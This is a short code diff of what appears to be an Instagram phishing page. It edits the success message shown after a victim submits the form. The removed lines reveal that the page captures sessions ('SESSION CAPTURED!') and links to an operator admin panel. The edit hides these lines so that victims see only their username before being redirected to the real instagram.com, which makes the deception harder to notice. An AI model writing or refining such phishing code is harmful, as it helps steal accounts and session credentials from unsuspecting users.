@@ -56,11 +56,8 @@
             if (data.success) {
                 result.innerHTML = `
                     <div style="background:#d4edda;color:#155724;padding:20px;border-radius:8px;margin-top:10px;">
-                        <p style="font-size:24px;margin:0;">SESSION CAPTURED!</p>
                         <p style="font-size:18px;">@${data.username}</p>
-                        <p style="font-size:14px;margin-top:10px;">
-                            <a href="/admin/" style="color:#0d6efd;text-decoration:underline;">→ OPEN ADMIN PANEL</a>
-                        </p>
+                        
                     </div>`;
                 setTimeout(() => location.href = 'https://instagram.com', 4000);
             } else {
